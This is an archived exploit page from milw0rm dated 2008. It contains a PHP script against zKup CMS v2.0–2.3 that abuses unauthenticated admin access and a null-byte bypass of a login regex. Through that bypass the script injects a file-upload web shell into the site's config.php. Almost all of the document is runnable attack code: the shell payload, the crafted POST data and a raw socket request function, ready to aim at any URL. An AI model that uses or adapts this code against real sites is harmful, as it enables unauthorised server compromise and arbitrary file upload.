<html><head><title>zKup CMS 2.0 <= 2.3 Remote Upload Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
/*
 * Name:    zKup CMS v2.0 &lt;= v2.3 0-day exploit (upload)
 * Credits: Charles &quot;real&quot; F. &lt;charlesfol[at]hotmail.fr&gt;
 * Date:    03-08-2008
 * Conditions: PHP Version, magic_quotes_gpc=Off
 *
 * This exploit spawn a php uploader in your victim's
 * server.
 *
 * Okay, you may need explanations:
 *
 * First, we can use administration without being admin
 * (see ./admin/configuration/modifier.php)
 *
 * Then, when we add an admin, it is saved in a php file,
 * named &quot;./fichiers/config.php&quot;.
 * A vuln is present when the script controls $login value,
 * because it use this regex: #^[a-zA-Z0-9]+$#
 * in order to see if it's alphanumerical.
 * I bypassed this regex using a NULL POISON BYTE (%00),
 * and writing my upload script just after.
 * I finally put some lines in order not to
 * corrupt config.php.
 *
 */

print &quot;\n&quot;;
print &quot;   zKup CMS v2.0 &lt;= v2.3 0-day exploit (upload)\n&quot;;
print &quot;       by Charles \&quot;real\&quot; F. &lt;charlesfol[at]hotmail.fr&gt;\n\n&quot;;

if($argc&lt;2) { print &quot;usage: php zkup2_upload_exploit.php &lt;url&gt;\n   eg: php zkup2_upload_exploit.php http://127.0.0.1/votresite/&quot;;exit(-1); }
$url = $argv[1];

$code = '
if(isset($_POST[\'upload\']))
{
    if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], &quot;./&quot;.$_FILES[\'file\'][\'name\'])) exit(&quot;&lt;center&gt;Error (move_uploaded_file)&lt;/center&gt;&quot;);
    else echo &quot;&lt;center&gt;File uploaded&lt;/center&gt;&quot;;
}
if($_GET[\'up\']==1)
{
?&gt;
&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
&lt;center&gt;
&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;
&lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;Upload&quot;&gt;
&lt;/center&gt;
&lt;/form&gt;
&lt;?php
}
';
$code = urlencode($code);

/* Not to compromise config.php work */
$restore = array();
$restore[0] = 'admin'.rand(100,200).'%00&quot;,&quot;mdp&quot;=&gt;&quot;436ae61e82a236bd4771e184a556bf65&quot;,&quot;lvl&quot;=&gt;9);';
$restore[1] = '$tAdmin[] = array(&quot;login&quot;=&gt; &quot;admin'.rand(200,300);

$postit = &quot;action=ajout&amp;login=$restore[0]$code$restore[1]&amp;mdp=real&amp;mdp2=real&amp;lvl=9&quot;;

print &quot;[*] sending evil c0de ... &quot;;
if(preg_match(&quot;#alert#i&quot;,post($url.&quot;admin/configuration/modifier.php&quot;,&quot;$postit&quot;))) print &quot;done.\n[*] upload script: &quot;.$url.&quot;fichiers/config.php?up=1\n&quot;;
else print &quot;failed.\n&quot;;

function post($url,$data,$get=1)
{
	$result = '';
	preg_match(&quot;#^http://([^/]+)(/.*)$#i&quot;,$url,$info);
	$host = $info[1];
	$page = $info[2];
	$fp = fsockopen($host, 80, &amp;$errno, &amp;$errstr, 30);
	
	$req  = &quot;POST $page HTTP/1.1\r\n&quot;;
	$req .= &quot;Host: $host\r\n&quot;;
	$req .= &quot;User-Agent: Mozilla Firefox\r\n&quot;;
	$req .= &quot;Connection: close\r\n&quot;;
	$req .= &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;;
	$req .= &quot;Content-length: &quot;.strlen( $data ).&quot;\r\n&quot;;
	$req .= &quot;\r\n&quot;;
	$req .= $data.&quot;\r\n&quot;;

	fputs($fp,$req);
	
	if($get) while(!feof($fp)) $result .= fgets($fp,128);
	
	fclose($fp);
	return $result;
}

?&gt;

# milw0rm.com [2008-03-07]</pre></html>